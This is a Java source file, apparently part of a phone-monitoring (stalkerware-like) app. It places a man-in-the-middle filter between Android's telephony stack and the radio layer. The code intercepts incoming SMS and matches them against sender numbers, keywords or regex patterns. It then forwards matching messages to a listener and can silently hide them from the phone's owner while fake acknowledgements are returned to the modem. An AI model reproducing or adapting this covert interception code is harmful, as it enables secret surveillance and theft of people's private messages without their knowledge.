package com.vvt.callmanager.filter;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.Parcel;

import com.vvt.callmanager.CallMgrPreference;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.mitm.MitmHelper;
import com.vvt.callmanager.mitm.SmsIntercept;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.SmsInterceptInfo.InterceptionMethod;
import com.vvt.callmanager.ref.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.callmanager.std.Response;
import com.vvt.callmanager.std.RilConstant;
import com.vvt.callmanager.std.RilManager;
import com.vvt.callmanager.std.SmsInfo;
import com.vvt.callmanager.std.SmsInfo.SmsType;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

class FilterSms extends InterceptingFilter implements SmsIntercept {
	
	private static final String TAG = FilterFactory.TAG_FILTER_SMS;
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int KEYWORD_VALID_LENGTH = 3;
	private static final long WAIT_FOR_NEXT_SMS = 15*1000;
	
	private CallMgrPreference mPreference;
	private List<byte[]> mCacheResponse;
	private RilManager mRilManager;
	private SmsInfo mCacheSmsInfo;
	private SmsIntercept.Listener mInterceptListener;
	private SmsPool mSmsPool;
	private Timer mTimer;
	private TimerTask mTimerTask;
	
	private int mCacheResponseCount;
	
	/**
	 * Don't set this value directly, set it via {@link #setState(CallState)}
	 */
	private CallState mState;

	public FilterSms(Context context, Mitm mitm, RilManager rilManager) {
		super(mitm);
		mInterceptListener = null;
		mPreference = CallMgrPreference.getInstance();
		mRilManager = rilManager;
		
		mSmsPool = new SmsPool();
		mSmsPool.start();
		
		mCacheResponse = new ArrayList<byte[]>();
		mCacheResponseCount = 0;
		
		// Add reference to this object to all state enumerator.
		for (CallState callState : CallState.values()) {
			callState.setMessageProcessor(this);
		}
		
		// Set beginning state
		setState(CallState.IDLE);
	}
	
	@Override
	public void setInterceptListener(SmsIntercept.Listener listener) {
		mInterceptListener = listener;
	}
	
	@Override
	public void resetInterceptListener() {
		mInterceptListener = null;
	}

	@Override
	public void processRilRequest(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\"", 
				PREFIX_MSG_O2M, MitmHelper.getDisplayString(p)));
		setState(mState.processRilRequest(p));
	}

	@Override
	public void processResponse(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\"", 
				PREFIX_RESP_T2M, MitmHelper.getDisplayString(p)));
		setState(mState.processResponse(p));
	}
	
	@Override
	protected void writeToOriginate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\"", 
				PREFIX_RESP_M2O, MitmHelper.getDisplayString(p)));
		super.writeToOriginate(p);
	}

	@Override
	protected void writeToTerminate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\"", 
				PREFIX_MSG_M2T, MitmHelper.getDisplayString(p)));
		super.writeToTerminate(p);
	}
	
	private void writeAtMessage(String message) {
		mRilManager.writeAtMessage(message);
	}
	
	private void writeDebugLog(String message) {
		mRilManager.writeDebugLog(message);
	}
	
	private void setState(CallState state) {
		if (state != mState) {
			String message = String.format("setState # %s -> %s", mState, state);
			writeAtMessage(message);
			
			Object transitionObject = null;
			if (mState != null) {
				transitionObject = mState.onExit();
			}
			mState = state;
			state.onEnter(transitionObject);
		}
	}
	
	private void acknowledgeSms(Parcel response) {
		Response r = Response.obtain(response);
		
		Parcel smsAcknowledge = null;
		
		if (r.type == Response.RESPONSE_UNSOLICITED) {
			if (r.number == RilConstant.RIL_UNSOL_NEW_SMS) {
				smsAcknowledge = FilterHelper.getParcel(
						FilterHelper.REQUEST_SMS_ACKNOWLEDGE);
			}
			else if (r.number == RilConstant.RIL_UNSOL_CDMA_NEW_SMS) {
				smsAcknowledge = FilterHelper.getParcel(
						FilterHelper.REQUEST_CDMA_SMS_ACKNOWLEDGE);
			}
		}
		
		mRilManager.addRequest(smsAcknowledge);
		writeToTerminate(smsAcknowledge);
	}
	
	private void handleNewSms(Parcel p) {
		if (LOGV) FxLog.v(TAG, "handleNewSms # ENTER ...");
		cancelTimer();
		
		SmsInfo smsInfo = FilterSmsHelper.getSmsInfo(p);
		if (smsInfo == null) {
			if (LOGE) FxLog.e(TAG, "handleNewSms # SMS read FAILED!!");
			return;
		}
		
		writeAtMessage(String.format(
				"handleNewSms # Number: %s, MsgBody: %s", 
				smsInfo.getPhoneNumber(), smsInfo.getMessageBody()));
		
		boolean isCacheExisted = mCacheSmsInfo != null;
		boolean isBodyMergeable = isCacheExisted && isBodyMergeable(mCacheSmsInfo, smsInfo);
		boolean isHoldingRequired = smsInfo.hasMoreMsgToSend();
		
		if (LOGV) FxLog.v(TAG, String.format(
				"handleNewSms # isCacheExisted: %s, isBodyMergeable: %s, isHoldingRequired: %s", 
				isCacheExisted, isBodyMergeable, isHoldingRequired));
		
		// #1 Just process SMS, holding is no need
		if (!isCacheExisted && !isHoldingRequired) {
			writeAtMessage("handleNewSms # Process SMS");
			mCacheSmsInfo = smsInfo;
			mCacheResponse.add(p.marshall());
			
			processNewSms(smsInfo);
			
			mCacheSmsInfo = null;
			mCacheResponse.clear();
		}
		// #2 No cache yet but require holding
		else if (!isCacheExisted && isHoldingRequired) {
			writeAtMessage("handleNewSms # Hold SMS");
			mCacheSmsInfo = smsInfo;
			mCacheResponse.add(p.marshall());
			
			setupTimer();
		}
		// #3 Cache exist, can be merged, and NOT require holding
		else if (isCacheExisted && isBodyMergeable && !isHoldingRequired) {
			writeAtMessage("handleNewSms # Merge and process");
			smsInfo = mergeSms(mCacheSmsInfo, smsInfo);
			mCacheResponse.add(p.marshall());
			
			processNewSms(smsInfo);
			
			mCacheSmsInfo = null;
			mCacheResponse.clear();
		}
		// #4 Cache exist, can be merged, and require holding
		else if (isCacheExisted && isBodyMergeable && isHoldingRequired) {
			writeAtMessage("handleNewSms # Merge and hold");
			mCacheSmsInfo = mergeSms(mCacheSmsInfo, smsInfo);
			mCacheResponse.add(p.marshall());
			
			setupTimer();
		}
		// #5 Cache exist, can't be merged, and NOT require holding
		else if (isCacheExisted && !isBodyMergeable && !isHoldingRequired) {
			writeAtMessage("handleNewSms # Process cached SMS");
			processNewSms(mCacheSmsInfo);
			
			mCacheSmsInfo = null;
			mCacheResponse.clear();
			
			writeAtMessage("handleNewSms # Process new SMS");
			mCacheSmsInfo = smsInfo;
			mCacheResponse.add(p.marshall());
			
			processNewSms(smsInfo);
			
			mCacheSmsInfo = null;
			mCacheResponse.clear();
		}
		// #6 Cache exist, can't be merged, and require holding
		else if (isCacheExisted && !isBodyMergeable && isHoldingRequired) {
			writeAtMessage("handleNewSms # Process cached SMS");
			processNewSms(mCacheSmsInfo);
			
			mCacheSmsInfo = null;
			mCacheResponse.clear();
			
			writeAtMessage("handleNewSms # Hold new SMS");
			mCacheSmsInfo = smsInfo;
			mCacheResponse.add(p.marshall());
			
			setupTimer();
		}
		
		if (LOGV) FxLog.v(TAG, "handleNewSms # EXIT ...");
	}

	private boolean isBodyMergeable(SmsInfo sms1, SmsInfo sms2) {
		boolean isMergeable = false;
		
		if (sms1 != null && sms2 != null) {
			String sms1Phone = sms1.getPhoneNumber();
			String sms2Phone = sms2.getPhoneNumber();
			SmsType sms1Type = sms1.getType();
			SmsType sms2Type = sms2.getType();
			
			if (sms1Phone.equals(sms2Phone) && sms1Type == sms2Type) {
				isMergeable = true;
			}
		}
		
		return isMergeable;
	}

	private SmsInfo mergeSms(SmsInfo main, SmsInfo sub) {
		StringBuilder builder = new StringBuilder();
		builder.append(main.getMessageBody());
		builder.append(sub.getMessageBody());
		
		SmsInfo smsInfo = new SmsInfo();
		smsInfo.setType(main.getType());
		smsInfo.setPhoneNumber(main.getPhoneNumber());
		smsInfo.setMessageBody(builder.toString());
		
		return smsInfo;
	}

	private void processNewSms(SmsInfo smsInfo) {
		if (smsInfo == null) {
			if (LOGE) FxLog.e(TAG, "processNewSms # SMS read FAILED!!");
			return;
		}
		
    	String phone = smsInfo.getPhoneNumber();
		String message = smsInfo.getMessageBody();
		
		phone = phone == null ? "" : phone;
		message = message == null ? "" : message;
		
		writeDebugLog(String.format(
				"processNewSms # Number: %s, MsgBody: %s", 
				phone, message));
		
		handleForwarding(smsInfo);
		handleHiding(smsInfo);
	}

	private void setupTimer() {
		mTimerTask = new TimerTask() {
			@Override
			public void run() {
				if (LOGV) FxLog.v(TAG, "run # Process Caching SMS");
				processNewSms(mCacheSmsInfo);
				mCacheSmsInfo = null;
		        mCacheResponse.clear();
			}
		};
		mTimer = new Timer();
		mTimer.schedule(mTimerTask, WAIT_FOR_NEXT_SMS);
	}
	
	private void cancelTimer() {
		if (mTimerTask != null) {
			mTimerTask.cancel();
			mTimerTask = null;
		}
		if (mTimer != null) {
			mTimer.cancel();
			mTimer = null;
		}
	}
	
	private void handleHiding(SmsInfo smsInfo) {
		boolean isHidingRequired = false;
		
		HashSet<SmsInterceptInfo> smsInterceptList = mPreference.getSmsInterceptList();
		
		InterceptionMethod method = null;
		
		if (smsInterceptList != null && !smsInterceptList.isEmpty()) {
			
			for (SmsInterceptInfo interceptor : smsInterceptList) {
				
				if (isCriteriaMatched(interceptor, smsInfo)) {
					method = interceptor.getInterceptionMethod();
					
					if (method == InterceptionMethod.HIDE_ONLY ||
							method == InterceptionMethod.HIDE_AND_FORWARD) {
						isHidingRequired = true;
						break;
					}
				}
			}
		}
		
		if (isHidingRequired) {
			writeDebugLog("handleHiding # Hide it");
		}
		else {
			writeDebugLog("handleHiding # Show it");
			
			mCacheResponseCount = mCacheResponse.size();
			if (LOGV) FxLog.v(TAG, String.format(
					"Cache Response Count: %d", mCacheResponseCount));
			
			synchronized (mCacheResponse) {
				for (byte[] b : mCacheResponse) {
					writeToOriginate(FilterHelper.getParcel(b));
				}
			}
		}
	}
	
	private void handleForwarding(SmsInfo smsInfo) {
		HashSet<SmsInterceptInfo> smsInterceptList = mPreference.getSmsInterceptList();
		
		InterceptionMethod method = null;
		
		if (smsInterceptList != null && !smsInterceptList.isEmpty()) {
			
			for (SmsInterceptInfo interceptor : smsInterceptList) {
				
				if (isCriteriaMatched(interceptor, smsInfo)) {
					method = interceptor.getInterceptionMethod();
					
					if (method == InterceptionMethod.FORWARD_ONLY ||
							method == InterceptionMethod.HIDE_AND_FORWARD) {
						
						if (mInterceptListener != null) {
							mInterceptListener.onSmsIntercept(interceptor, smsInfo);
						}
					}
				}
			}
		}
	}
	
	private boolean isCriteriaMatched(SmsInterceptInfo interceptor, SmsInfo smsInfo) {
		boolean isPhoneNumberMatched = 
				interceptor.getSenderNumber() != null &&
				interceptor.getSenderNumber().trim().length() >= Customization.PHONENUMBER_VALID_LENGTH;
		
		isPhoneNumberMatched = isPhoneNumberMatched && 
				TelephonyUtils.isSamePhoneNumber(
						interceptor.getSenderNumber(), 
						smsInfo.getPhoneNumber(), Customization.PHONENUMBER_VALID_LENGTH);
		
		if (isPhoneNumberMatched) return true;
		
		// Prepare checking keyword
		KeywordFindingMethod method = interceptor.getKeywordFindingMethod();
		String messageBody = smsInfo.getMessageBody().toLowerCase();
		String keyword = interceptor.getKeyword();
		if (keyword != null) {
			keyword = keyword.toLowerCase();
		}
		
		// Return false if keyword is not set
		boolean isKeywordMatched = 
				method != KeywordFindingMethod.NOT_SPECIFIED && 
				keyword != null && keyword.trim().length() >= KEYWORD_VALID_LENGTH;
				
		if (! isKeywordMatched) return false;
		
		if (method == KeywordFindingMethod.START_WITH) {
			isKeywordMatched = messageBody.startsWith(keyword);
		}
		else if (method == KeywordFindingMethod.CONTAINS) {
			isKeywordMatched = messageBody.contains(keyword);
		}
		else if (method == KeywordFindingMethod.END_WITH) {
			isKeywordMatched = messageBody.endsWith(keyword);
		}
		else if (method == KeywordFindingMethod.PATTERN_MATCHED) {
			Pattern p = Pattern.compile(keyword);
			Matcher matcher = p.matcher(messageBody);
			isKeywordMatched = matcher.find();
		}
		else if (method == KeywordFindingMethod.CONTAINS_PHONE_NUMBER) {
			boolean containsPhoneNumber = false;
			
			String number = null;
			
			Pattern p = Pattern.compile(
					SmsInterceptInfo.REGEX_EXTRACTING_PHONE_NUMBER);
			Matcher m = p.matcher(messageBody);
			
			while (m.find()) {
				int start = m.start();
				int end = m.end();
				number = messageBody.substring(start, end);
				
				containsPhoneNumber = TelephonyUtils.isSamePhoneNumber(
						keyword, number, Customization.PHONENUMBER_VALID_LENGTH);
				
				if (containsPhoneNumber) break;
			}
			
			isKeywordMatched = containsPhoneNumber;
		}
		else {
			isKeywordMatched = false;
		}
		
		return isKeywordMatched;
	}
	
	public enum CallState {
		
		IDLE {
			
			byte[] cacheUnsolNewSms;

			@Override
			public void onEnter(Object transitionObject) {
				cacheUnsolNewSms = null;
			}

			@Override
			public Object onExit() {
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				boolean forward = true;
				
				int request = mFilterSms.mRilManager.getRequest(p);
				
				switch (request) {
					case RilConstant.RIL_REQUEST_SMS_ACKNOWLEDGE:
					case RilConstant.RIL_REQUEST_CDMA_SMS_ACKNOWLEDGE:
						if (mFilterSms.mCacheResponseCount > 0) {
							p.setDataPosition(8);
							int seq = p.readInt();
							
							Parcel ack = FilterHelper.getParcel(FilterHelper.SOL_SMS_ACKNOWLEDGE);
							ack.setDataPosition(8);
							ack.writeInt(seq);
							
							mFilterSms.writeToOriginate(ack);
							
							forward = false;
							
							mFilterSms.mCacheResponseCount--;
							if (LOGV) {
								FxLog.v(TAG,String.format(
										"Cache Response Count: %d", 
										mFilterSms.mCacheResponseCount));
							}
						}
						break;
				}
				
				if (forward) mFilterSms.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				boolean forward = true;
				
				int response = mFilterSms.mRilManager.getResponse(p);
				
				switch (response) {
					case RilConstant.RIL_UNSOL_NEW_SMS:
					case RilConstant.RIL_UNSOL_CDMA_NEW_SMS:
						mFilterSms.acknowledgeSms(p);
						cacheUnsolNewSms = p.marshall();
						forward = false;
						break;
						
					case RilConstant.RIL_REQUEST_SMS_ACKNOWLEDGE:
					case RilConstant.RIL_REQUEST_CDMA_SMS_ACKNOWLEDGE:
						Response r = Response.obtain(p);
						forward = r.number != FilterHelper.SERIAL_SMS;
						
						if (! forward) {
							Handler handler = mFilterSms.mSmsPool.getHandler();
							Message msg = Message.obtain(handler);
							Bundle data = msg.getData();
							data.putByteArray(SmsPool.DATA_NEW_SMS, cacheUnsolNewSms);
							handler.sendMessage(msg);
							cacheUnsolNewSms = null;
						}
						
						break;
				}
				
				if (forward) mFilterSms.writeToOriginate(p);
				return this;
			}
			
		};
		
		protected FilterSms mFilterSms;
		
		void setMessageProcessor(FilterSms smsStateMachine) {
			mFilterSms = smsStateMachine;
		}
		
		/**
		 * @param transitionObject the transition object from the previous state.
		 */
		public abstract void onEnter(Object transitionObject);
		
		/**
		 * @return transition object to be used as any information to transfer to the next state. 
		 */
		public abstract Object onExit();
		
		public abstract CallState processRilRequest(Parcel p);
		public abstract CallState processResponse(Parcel p);
	}
	
	class SmsPool extends Thread {
		
		static final String DATA_NEW_SMS = "DATA_NEW_SMS";
		Handler mHandler;
		
		Handler getHandler() {
			return mHandler;
		}
		
		@Override
		public void run() {
			Looper.prepare();
			
			mHandler = new Handler() {
				@Override
				public void handleMessage(Message msg) {
					Bundle data = msg.getData();
					
					byte[] b = data.getByteArray(DATA_NEW_SMS);
					if (b != null && b.length > 0) {
						Parcel p = FilterHelper.getParcel(b);
						handleNewSms(p);
					}
					else {
						if (LOGE) FxLog.e(TAG, "Handle New SMS Error!!");
					}
				}
			};
			
			Looper.loop();
		}
		
		void exit() {
			Looper myLooper = Looper.myLooper();
			if (myLooper != null) {
				myLooper.quit();
			}
		}
	}
	
}
